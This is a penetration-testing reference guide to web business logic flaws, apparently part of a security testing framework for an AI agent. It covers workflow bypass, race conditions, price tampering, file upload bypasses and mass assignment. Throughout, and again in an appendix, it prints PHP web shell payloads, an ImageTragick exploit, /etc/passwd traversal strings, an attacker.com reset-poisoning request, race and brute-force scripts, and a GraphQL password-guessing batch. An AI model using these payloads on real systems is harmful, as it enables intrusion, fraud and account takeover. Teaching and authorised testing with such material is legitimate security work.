# Business Logic Vulnerabilities - Comprehensive Reference Guide

> *"The application tells me its secrets. I just have to ask the right questions."* - SPIDER

**Last Updated**: December 2025
**GHOST Framework Resource**: Web Application Testing

---

## Table of Contents

1. [Overview](#overview)
2. [Workflow Bypass](#1-workflow-bypass)
3. [Race Conditions](#2-race-conditions)
4. [Data Integrity Attacks](#3-data-integrity-attacks)
5. [File Upload Attacks](#4-file-upload-attacks)
6. [Application Abuse](#5-application-abuse)
7. [Testing Methodology](#6-testing-methodology)
8. [Tools Reference](#7-tools-reference)
9. [Sources](#8-sources)

---

## Overview

Business logic vulnerabilities are distinct from other security flaws because they target the fundamental logic and design of a web application rather than exploiting coding errors. These vulnerabilities:

- Cannot be detected by automated vulnerability scanners
- Rely upon the skills and creativity of the penetration tester
- Are usually application-specific
- Can be among the most detrimental to an application if exploited
- Require understanding of the business domain and attacker goals

**Key Principle**: Testing for business logic flaws requires thinking in unconventional methods. If an application's process is designed to perform steps 1, 2, 3 in order, what happens if the user goes from step 1 straight to step 3?

---

## 1. Workflow Bypass

### 1.1 Multi-Step Process Manipulation

Workflow bypass involves skipping steps in multi-step processes, such as order approval or payment confirmation.

#### Attack Scenarios

| Scenario | Description | Impact |
|----------|-------------|--------|
| Direct URL Access | Accessing final step URL without completing prior steps | Complete restricted actions without authorization |
| Step Skipping | Jumping from step 1 to step 3 in authentication flows | Authentication bypass |
| State Token Manipulation | Modifying or reusing state tokens between steps | Process flow bypass |
| Hidden Parameter Tampering | Modifying hidden fields that track process state | Order completion without payment |

#### Testing Techniques

```
1. Map the complete workflow
   - Identify all steps in the process
   - Document expected sequence
   - Note all parameters passed between steps

2. Test each transition point
   - Attempt to access step N+1 directly
   - Modify or remove state tracking parameters
   - Replay requests from completed sessions

3. Manipulate state indicators
   - Look for: step=, phase=, state=, progress=
   - Try sequential values: 0, 1, 2, 3...
   - Test encoded values (base64, hex)
```

#### Real-World Examples

**OTP Bypass via Response Manipulation**:
- Application required 2FA via email OTP
- POST response to OTP request contained the OTP value
- Attacker could read OTP directly from response, bypassing email verification

**E-commerce Checkout Skip**:
- Order process: Cart -> Payment -> Confirmation
- Direct access to /order/confirm with valid session
- Application failed to verify payment step completion

### 1.2 Missing Server-Side Validation

Client-side validation without server-side enforcement creates bypass opportunities.

#### Common Bypass Patterns

```javascript
// Client-side only validation (vulnerable)
if (formData.quantity > 0 && formData.quantity <= 100) {
    submitOrder();
}

// Bypass: Intercept request, set quantity to -1 or 10000
```

#### Testing Checklist

- [ ] Disable JavaScript and submit forms
- [ ] Intercept requests and modify validated fields
- [ ] Send requests directly via curl/Burp bypassing client
- [ ] Check for hidden field validation reliance
- [ ] Test boundary values (0, negative, MAX_INT)

---

## 2. Race Conditions

### 2.1 TOCTOU (Time-of-Check to Time-of-Use)

TOCTOU vulnerabilities occur when an application checks a condition and later uses the result, assuming nothing changed between check and use.

#### The Race Window

```
Time →
┌─────────────────────────────────────────────────────────────┐
│  [CHECK]              [RACE WINDOW]              [USE]      │
│    ↓                       ↓                       ↓        │
│  Verify balance      Attacker modifies       Deduct amount  │
│  = $100             state in this gap         from balance  │
└─────────────────────────────────────────────────────────────┘
```

#### Notable 2024 CVEs

| CVE | Product | Description |
|-----|---------|-------------|
| CVE-2024-50379 | Apache Tomcat | TOCTOU in JSP compilation allowing RCE |
| CVE-2024-30088 | Windows Kernel | TOCTOU allowing privilege escalation |
| CVE-2024-7348 | PostgreSQL | TOCTOU in pg_dump allowing arbitrary SQL execution |

### 2.2 Limit Bypass via Race

Limit overruns are a subtype of TOCTOU flaws where rate limits or usage caps are bypassed.

#### Attack Scenario: Coupon Reuse

```
Normal Flow:
1. User applies coupon "SAVE20"
2. Server checks: coupon used? NO
3. Server applies discount
4. Server marks coupon as used

Race Attack:
1. Send 20 identical requests simultaneously
2. All 20 requests check coupon status: NOT USED
3. All 20 requests apply discount
4. Only last one marks coupon as used
5. Result: 20x discount applied
```

### 2.3 Double-Spend Attacks in Web Applications

While originally a blockchain concept, double-spend patterns appear in web applications:

#### Scenarios

| Scenario | Attack Pattern | Impact |
|----------|---------------|--------|
| Wallet Balance | Simultaneous withdrawals | Extract more than balance |
| Gift Card | Parallel redemption requests | Redeem same card multiple times |
| Promo Code | Race condition on single-use codes | Multiple applications |
| Points System | Concurrent point redemptions | Exceed point balance |

### 2.4 Turbo Intruder Techniques

#### Single-Packet Attack (HTTP/2)

The single-packet attack enables simultaneous delivery of 20-30 HTTP requests within a single TCP packet, eliminating network jitter.

**Performance Metrics**:
- Median spread: 1ms (vs 4ms with last-byte sync)
- Standard deviation: 0.3ms (vs 3ms traditional)
- Precision improvement: 4-10x

#### Turbo Intruder Setup

```python
# race-single-packet-attack.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          engine=Engine.BURP2)

    # Queue 30 identical requests
    for i in range(30):
        engine.queue(target.req, gate='race1')

    # Send all at once
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

#### HTTP/2 Multiplexing

```
HTTP/1.1 (Sequential):
Packet 1: Request 1 → Response 1
Packet 2: Request 2 → Response 2
...

HTTP/2 (Multiplexed):
Single TCP Packet:
├── Request 1 (Stream 1)
├── Request 2 (Stream 3)
├── Request 3 (Stream 5)
...
└── Request 30 (Stream 59)
→ All processed nearly simultaneously
```

#### Server Limitations

| Server | SETTINGS_MAX_CONCURRENT_STREAMS |
|--------|--------------------------------|
| Apache | 100 |
| Nginx | 128 |
| Go | 250 |
| NodeJS | Unlimited |
| nghttp2 | Unlimited |

#### Advanced Techniques

**Warming the Connection**:
```python
# Send dummy requests to trigger rate limiting delay
# This creates a more predictable processing window
for i in range(100):
    engine.queue(dummyRequest)
time.sleep(1)
# Now send race attack
```

**First Sequence Sync**:
- Extends beyond 65,535 byte TCP limit
- Uses IP fragmentation
- TCP sequence number reordering
- Enables ~10,000 simultaneous requests

---

## 3. Data Integrity Attacks

### 3.1 Price Manipulation

#### Common Vectors

| Vector | Technique | Example |
|--------|-----------|---------|
| Direct Parameter | Modify price in POST/PUT | `price=0.01` instead of `price=99.99` |
| Hidden Fields | Alter hidden form values | `<input type="hidden" name="price" value="1">` |
| Cookie Values | Modify cart cookies | `cart_total=0.00` |
| API Requests | Intercept and modify | JSON body: `{"amount": 0.01}` |

#### Real-World CVE: CVE-2025-56426 (Bagisto CMS)

```http
POST /cart/update HTTP/1.1
Host: target.com
Content-Type: application/json

{
    "items": [
        {"product_id": 123, "quantity": -1, "price": 500}
    ]
}

Result: Cart total becomes negative, allowing free checkout
```

### 3.2 Quantity Tampering

#### Attack Patterns

```
1. Negative Quantities
   quantity=-1 → Subtracts from total instead of adding

2. Zero Quantities
   quantity=0 → Item added but no charge

3. Decimal Quantities
   quantity=0.001 → Rounds down to zero cost

4. Integer Overflow
   quantity=2147483648 → Wraps to negative or zero
```

#### Testing Matrix

| Input | Expected Behavior | Vulnerable Behavior |
|-------|-------------------|---------------------|
| `-1` | Error/Rejection | Negative total |
| `0` | Error/Rejection | Free item |
| `0.5` | Round up | Round down to 0 |
| `999999999` | Error/Limit | Integer overflow |
| `1e308` | Error | Infinity/NaN handling |

### 3.3 Currency/Discount Abuse

#### Currency Confusion

```
Attack: Change currency parameter mid-transaction

Step 1: Add items (USD pricing displayed)
Step 2: Change currency=JPY in payment request
Step 3: $100 USD charged as ¥100 ($0.67 USD)
```

#### Discount Stacking

```
Normal: One coupon per order
Attack: Apply multiple coupon codes via:
- Race condition
- Separate API calls
- Array parameter: coupons[]=CODE1&coupons[]=CODE2
- Multiple requests with different session states
```

### 3.4 Coupon/Voucher Replay

#### Exploitation Techniques

| Technique | Method | Prevention |
|-----------|--------|------------|
| Replay Attack | Reuse captured valid codes | One-time use + invalidation |
| Brute Force | Enumerate code patterns | Rate limiting + complex codes |
| Code Sharing | Mass distribution | User-binding + verification |
| Multiple Redemption | Race condition | Atomic transactions |
| Account Hopping | New accounts for new-user codes | Device fingerprinting |

#### Brute Force Example

```bash
# Weak: Sequential codes
CODE001, CODE002, CODE003...

# Attack: Enumerate all valid codes
for i in $(seq 1 999); do
    curl -X POST https://target.com/apply-coupon \
        -d "code=CODE$(printf '%03d' $i)"
done
```

#### Real-World Case: Uber $50,000 Abuse

- Attacker manipulated referral code
- Shared via mass email and Reddit
- Accumulated $50,000 in credits
- Discovered 8 weeks later via manual review

---

## 4. File Upload Attacks

### 4.1 Extension Bypass Techniques

#### Bypass Methods

| Method | Example | Notes |
|--------|---------|-------|
| Double Extension | `shell.php.jpg` | Apache may execute .php |
| Null Byte | `shell.php%00.jpg` | Truncates at null byte |
| Case Variation | `shell.PhP` | Case-insensitive systems |
| Alternative Extensions | `.php5`, `.phtml`, `.phar` | Less common PHP extensions |
| Special Characters | `shell.php;.jpg` | Semicolon truncation |
| Unicode/Encoding | `shell.ph%70` | URL-encoded 'p' |
| Trailing Dots/Spaces | `shell.php.` | Windows removes trailing dots |

#### Server-Specific Extensions

```
PHP: .php, .php5, .php7, .phtml, .phar, .phps, .pht
ASP: .asp, .aspx, .cer, .asa, .asax
JSP: .jsp, .jspx, .jsw, .jsv, .jspf
Other: .shtml (SSI), .swf (Flash), .htaccess (Apache config)
```

### 4.2 Content-Type Manipulation

```http
# Normal upload
Content-Type: application/x-php

# Bypass via MIME type spoofing
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif

# With actual PHP content
<?php system($_GET['cmd']); ?>
```

### 4.3 Polyglot Files

Polyglot files function as multiple formats simultaneously.

#### GIF + PHP Polyglot

```php
GIF89a<?php system($_GET['cmd']); ?>
```
- Passes magic byte check for GIF (GIF89a)
- Executes as PHP when accessed with .php extension

#### BMP + HTML + JAR Polyglot

```
[BMP Header][HTML Content][JAR Content]
```
- Validates as image/bmp
- Renders as HTML when opened in browser
- Executes as Java when loaded as applet

### 4.4 Path Traversal in Filename

#### Attack Vectors

```http
# Standard path traversal
filename="../../../etc/passwd"
filename="....//....//etc/passwd"

# URL-encoded
filename="..%2f..%2f..%2fetc/passwd"
filename="..%252f..%252f..%252fetc/passwd"  # Double-encoded

# Null byte injection (older systems)
filename="../../../etc/passwd%00.jpg"

# Unicode normalization
filename="..％2f..％2f/etc/passwd"
```

### 4.5 Server-Side Processing Attacks

#### ImageMagick (ImageTragick)

**CVE-2016-3714** - Remote Code Execution

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|ls "-la)'
pop graphic-context
```

Save as `exploit.mvg` or `exploit.svg` and upload.

#### Key ImageMagick CVEs

| CVE | Impact | Trigger |
|-----|--------|---------|
| CVE-2016-3714 | RCE | MVG/SVG processing |
| CVE-2016-3715 | File Delete | ephemeral: protocol |
| CVE-2016-3716 | File Move | msl: protocol |
| CVE-2016-3717 | Local File Read | label: protocol |
| CVE-2016-3718 | SSRF | Remote URL fetch |

#### Other Server-Side Processors

| Processor | Attack Vector | Impact |
|-----------|--------------|--------|
| FFmpeg | HLS playlists, concat demuxer | SSRF, Local file read |
| LibreOffice | OLE objects, macros | RCE |
| PDF Parsers | JavaScript, embedded objects | RCE, SSRF |
| XML Parsers | XXE in DOCX/XLSX | Data exfiltration |

---

## 5. Application Abuse

### 5.1 Feature Abuse Scenarios

#### Password Reset Poisoning

```http
POST /forgot-password HTTP/1.1
Host: attacker.com     # Poisoned Host header
X-Forwarded-Host: attacker.com

email=victim@target.com
```

Result: Reset link sent to victim contains `https://attacker.com/reset?token=xxx`

#### Other Feature Abuse Patterns

| Feature | Abuse Scenario |
|---------|----------------|
| Email Notifications | Send unlimited emails (spam) |
| Export Functions | Extract large datasets |
| Search | Regex DoS, data enumeration |
| File Sharing | Host malicious content |
| Referral Programs | Self-referral, fake accounts |
| Reviews/Comments | SEO spam, phishing links |

### 5.2 Mass Assignment Vulnerabilities

#### How It Works

```javascript
// Vulnerable code - direct binding
User.update(req.body);

// Request
POST /api/user/update
{
    "name": "John",
    "email": "john@example.com",
    "isAdmin": true,        // Attacker-added
    "role": "superuser"     // Attacker-added
}
```

#### Famous Example: GitHub 2012

- Mass assignment in public key update form
- Attacker added their SSH key to Ruby on Rails organization
- Gained commit access to Rails repository

#### Testing Checklist

```
1. Identify all updateable endpoints
2. Check API documentation for hidden parameters
3. Add suspected parameters:
   - isAdmin, is_admin, admin
   - role, roles, permissions
   - verified, approved, active
   - balance, credits, points
   - password, password_hash
```

### 5.3 Excessive Data Exposure

#### Detection Methods

```bash
# Compare authenticated vs unauthenticated responses
diff <(curl -s https://api.target.com/user/1 | jq .) \
     <(curl -s -H "Auth: token" https://api.target.com/user/1 | jq .)

# Check for sensitive fields in responses
grep -E "(ssn|password|secret|token|key|credit.?card)" response.json
```

#### Common Exposures

| Data Type | Example Field | Risk |
|-----------|--------------|------|
| PII | ssn, dob, address | Identity theft |
| Credentials | password_hash, api_key | Account takeover |
| Financial | credit_card, balance | Fraud |
| Internal | internal_id, debug_info | Attack surface expansion |

### 5.4 Function Limit Bypass

#### Rate Limit Bypass Techniques

| Technique | Implementation |
|-----------|---------------|
| Header Manipulation | `X-Forwarded-For: 127.0.0.1` |
| User-Agent Rotation | Change browser identifiers |
| IP Rotation | Proxy chains, Tor |
| Endpoint Variation | `/api/login/`, `/api/login/../login` |
| GraphQL Batching | Multiple operations in single request |
| Character Appending | `email=user@test.com` → `email=user@test.com.` |
| Case Variation | `/API/Login` vs `/api/login` |
| Cache Overflow | Flood with different usernames |

#### GraphQL Rate Limit Bypass

```graphql
# Single request, 100 login attempts
query {
  login1: login(email: "victim@test.com", password: "pass1") { token }
  login2: login(email: "victim@test.com", password: "pass2") { token }
  login3: login(email: "victim@test.com", password: "pass3") { token }
  ...
  login100: login(email: "victim@test.com", password: "pass100") { token }
}
```

---

## 6. Testing Methodology

### 6.1 Identifying Business Logic Flaws

#### Discovery Phase

```
1. Understand the Business Process
   ├── Review documentation
   ├── Map user journeys
   ├── Identify trust boundaries
   └── Document assumptions

2. Create Process Flow Diagrams
   ├── Normal flow
   ├── Exception handling
   ├── State transitions
   └── Data flow between steps

3. Identify High-Value Targets
   ├── Payment/financial operations
   ├── Authentication/authorization
   ├── Data access controls
   └── Rate-limited operations
```

### 6.2 Abuse Case Development

#### Template

```markdown
## Abuse Case: [Name]

### Actor
- Who: [Attacker type - anonymous, authenticated, admin]
- Goal: [What they want to achieve]

### Preconditions
- [What must be true before attack]

### Attack Steps
1. [Step 1]
2. [Step 2]
3. [Step N]

### Expected Outcome
- [What should happen if vulnerable]

### Indicators
- [How to detect successful exploitation]
```

#### Example Abuse Cases

**AC-001: Checkout Price Manipulation**
```
Actor: Authenticated user
Goal: Purchase items at reduced/zero price
Preconditions: User has items in cart
Attack Steps:
  1. Add items to cart normally
  2. Intercept checkout request
  3. Modify price/total parameters
  4. Submit modified request
Expected: Order placed at modified price
Indicators: Order total != (item prices × quantities)
```

**AC-002: Authentication Step Skip**
```
Actor: Unauthenticated attacker
Goal: Access authenticated areas without credentials
Preconditions: Know URL of post-login page
Attack Steps:
  1. Initiate login flow
  2. Capture session/state tokens
  3. Directly access post-login URL with tokens
  4. Bypass password verification
Expected: Access granted without password
Indicators: Session valid without complete auth flow
```

### 6.3 Edge Case Testing

#### Test Categories

| Category | Examples |
|----------|----------|
| Boundary Values | 0, -1, MAX_INT, empty string |
| Type Confusion | String where int expected, array for scalar |
| Encoding | Unicode, URL-encoded, double-encoded |
| Null/None | null, None, undefined, NaN |
| Race Conditions | Simultaneous requests |
| State Manipulation | Out-of-order operations |

#### Edge Case Matrix

```
For each input field:
┌─────────────────┬──────────────────────────────────────────┐
│ Type            │ Test Values                              │
├─────────────────┼──────────────────────────────────────────┤
│ Integer         │ 0, -1, MAX_INT, 2^31, scientific (1e10)  │
│ String          │ "", null, <script>, ${7*7}, ' OR '1'='1  │
│ Array           │ [], [null], [1,2,3,...,10000]            │
│ Object          │ {}, {"__proto__": {}}, deeply nested     │
│ Boolean         │ true, false, "true", 0, 1, "yes"         │
│ Date/Time       │ epoch, far future, far past, invalid     │
└─────────────────┴──────────────────────────────────────────┘
```

### 6.4 Tools and Automation

While business logic testing requires manual analysis, certain aspects can be automated:

#### Semi-Automated Testing

| Tool | Purpose | Automation Level |
|------|---------|------------------|
| Burp Suite Pro | Request manipulation, Turbo Intruder | High |
| OWASP ZAP | Scanning, fuzzing | Medium |
| Postman | API testing, collections | Medium |
| Selenium | UI automation, flow testing | High |
| Custom Scripts | Specific abuse case testing | Variable |

#### Burp Extensions for Business Logic

- **AuthMatrix**: Authorization testing across roles
- **AuthAnalyzer**: Automated authorization testing
- **Turbo Intruder**: Race condition exploitation
- **Logger++**: Detailed request/response logging

#### Custom Testing Scripts

```python
# Example: Race condition test
import asyncio
import aiohttp

async def apply_coupon(session, coupon_code):
    async with session.post(
        'https://target.com/api/apply-coupon',
        json={'code': coupon_code}
    ) as response:
        return await response.json()

async def race_test():
    async with aiohttp.ClientSession() as session:
        # Send 50 simultaneous requests
        tasks = [apply_coupon(session, 'SAVE50') for _ in range(50)]
        results = await asyncio.gather(*tasks)

        # Count successful applications
        successes = sum(1 for r in results if r.get('success'))
        print(f"Coupon applied {successes} times (expected: 1)")

asyncio.run(race_test())
```

---

## 7. Tools Reference

### Primary Tools

| Tool | Primary Use | Platform |
|------|-------------|----------|
| Burp Suite Professional | Comprehensive web testing | Cross-platform |
| Turbo Intruder | Race conditions, high-speed attacks | Burp Extension |
| OWASP ZAP | Open-source web scanner | Cross-platform |
| SQLMap | SQL injection automation | Python |
| Upload_Bypass | File upload testing | Python |

### Supporting Tools

| Tool | Use Case |
|------|----------|
| ExifTool | Polyglot file creation |
| ImageMagick | Image manipulation testing |
| ffuf | Fuzzing, content discovery |
| nuclei | Template-based scanning |
| GraphQL Voyager | GraphQL schema visualization |

### Custom Scripts Location

```
~/.claude/scripts/
├── ghost-race-test.py      # Race condition testing
├── ghost-upload-test.py    # File upload bypass
├── ghost-param-tamper.py   # Parameter manipulation
└── ghost-flow-test.py      # Workflow bypass testing
```

---

## 8. Sources

### Primary References

- [PortSwigger - Business Logic Vulnerabilities](https://portswigger.net/web-security/logic-flaws)
- [PortSwigger - Race Conditions](https://portswigger.net/web-security/race-conditions)
- [OWASP - Business Logic Testing](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/10-Business_Logic_Testing/00-Introduction_to_Business_Logic)
- [OWASP - Workflow Circumvention Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/06-Testing_for_the_Circumvention_of_Work_Flows)
- [OWASP - Mass Assignment Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)
- [OWASP - Abuse Case Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Abuse_Case_Cheat_Sheet.html)

### Research Papers

- [PortSwigger - The Single-Packet Attack](https://portswigger.net/research/the-single-packet-attack-making-remote-race-conditions-local)
- [PortSwigger - Smashing the State Machine](https://portswigger.net/research/smashing-the-state-machine)
- [PortSwigger - Turbo Intruder](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)
- [Flatt Security - Beyond the Limit: First Sequence Sync](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)

### Tutorials and Guides

- [HackTricks - Race Condition](https://book.hacktricks.xyz/pentesting-web/race-condition)
- [HackTricks - Rate Limit Bypass](https://book.hacktricks.xyz/pentesting-web/rate-limit-bypass)
- [HackTricks - Password Reset Bypass](https://book.hacktricks.xyz/pentesting-web/reset-password)
- [Intigriti - Advanced IDOR Guide](https://www.intigriti.com/blog/news/idor-a-complete-guide-to-exploiting-advanced-idor-vulnerabilities)
- [Intigriti - File Upload Vulnerabilities](https://www.intigriti.com/researchers/blog/hacking-tools/insecure-file-uploads-a-complete-guide-to-finding-advanced-file-upload-vulnerabilities)
- [Intigriti - Price Manipulation Vulnerabilities](https://www.intigriti.com/blog/news/top-6-price-manipulation-vulnerabilities-ecommerce)
- [Hacking Articles - Race Condition with Turbo Intruder](https://www.hackingarticles.in/exploiting-race-condition-using-turbo-intruder/)
- [YesWeHack - File Upload Attacks](https://blog.yeswehack.com/yeswerhackers/exploitation/file-upload-attacks-part-1/)
- [YesWeHack - Path Traversal Guide](https://www.yeswehack.com/learn-bug-bounty/practical-guide-path-traversal-attacks)
- [YesWeHack - Race Condition Guide](https://www.yeswehack.com/learn-bug-bounty/ultimate-guide-race-condition-vulnerabilities)

### Vulnerability-Specific

- [ImageTragick - ImageMagick Vulnerabilities](https://imagetragick.com/)
- [Snyk - Mass Assignment Tutorial](https://learn.snyk.io/lesson/mass-assignment/)
- [Vaadata - Password Reset Vulnerabilities](https://www.vaadata.com/blog/exploring-password-reset-vulnerabilities-and-security-best-practices/)
- [Vaadata - Race Conditions](https://www.vaadata.com/blog/what-is-a-race-condition-exploitations-and-security-best-practices/)

### API Security

- [OWASP - API3:2019 Excessive Data Exposure](https://owasp.org/API-Security/editions/2019/en/0xa3-excessive-data-exposure/)
- [Cobalt - Mass Assignment in APIs](https://www.cobalt.io/blog/mass-assignment-apis-exploitation-in-the-wild)
- [TCM Security - Mass Assignment](https://tcm-sec.com/exploiting-mass-assignment-vulnerabilities/)

### E-commerce and Payment

- [Fingerprint - Prevent Coupon Abuse](https://fingerprint.com/blog/prevent-coupon-promo-abuse-increase-sales/)
- [Voucherify - Coupon Fraud Prevention 2025](https://www.voucherify.io/blog/how-to-prevent-coupon-fraud-and-abuse)

---

## Appendix A: Quick Reference Payloads

### Workflow Bypass

```
# Direct step access
/checkout/step3
/order/confirm
/payment/success

# State manipulation
step=3&verified=true
state=completed
phase=final
```

### Race Condition

```bash
# Turbo Intruder single-packet
# File: race-single-packet-attack.py

# Burp Repeater: Group → Send group in parallel
```

### Price Manipulation

```json
{"price": 0.01}
{"price": -100}
{"quantity": -1}
{"discount": 100}
{"currency": "JPY"}
```

### File Upload

```
# Extensions
shell.php.jpg
shell.php%00.jpg
shell.PHP5
shell.phtml

# Content
GIF89a<?php system($_GET['cmd']); ?>

# Path traversal
../../../var/www/shell.php
....//....//shell.php
```

### Mass Assignment

```json
{
  "username": "attacker",
  "isAdmin": true,
  "role": "superuser",
  "verified": true,
  "balance": 99999
}
```

---

*"Every form is a door. Every parameter is a key. I try them all."* - SPIDER

**GHOST Framework** | Web Application Security Testing
